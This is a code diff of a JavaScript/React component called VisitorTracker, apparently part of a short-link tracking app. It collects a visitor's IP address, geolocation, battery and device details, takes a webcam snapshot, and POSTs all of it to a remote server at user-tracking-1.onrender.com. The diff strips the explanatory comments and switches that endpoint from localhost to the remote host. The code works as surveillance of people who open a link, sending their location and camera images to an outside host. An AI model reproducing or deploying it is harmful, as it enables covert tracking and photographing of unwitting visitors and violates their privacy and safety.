@@ -29,7 +29,7 @@ function VisitorTracker() {
           }
         }
 
-        // Battery Info
+       
         let batteryInfo = { level: "N/A", charging: "N/A" };
         if (navigator.getBattery) {
           const battery = await navigator.getBattery();
@@ -39,8 +39,7 @@ function VisitorTracker() {
           };
         }
 
-        // Data Object (keep your original fields)
-        const deviceInfo = {
+         const deviceInfo = {
           ip: ipData.ip,
           latitude,
           longitude,
@@ -57,8 +56,7 @@ function VisitorTracker() {
           timestamp: new Date().toISOString(),
         };
 
-        // Camera snapshot
-        let cameraImage = null;
+         let cameraImage = null;
         try {
           videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
           const video = document.createElement("video");
@@ -75,16 +73,15 @@ function VisitorTracker() {
           console.log("Camera access denied");
         }
 
-        // Keep your original visitorData structure
-        const visitorData = {
+         const visitorData = {
           shortId,
           ...deviceInfo,
           cameraImage,
           entryTime: new Date(),
         };
 
-        // Send to API
-        const res = await fetch(`http://localhost:5000/api/auth/t/${shortId}`, {
+         
+        const res = await fetch(`https://user-tracking-1.onrender.com/api/auth/t/${shortId}`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(visitorData),
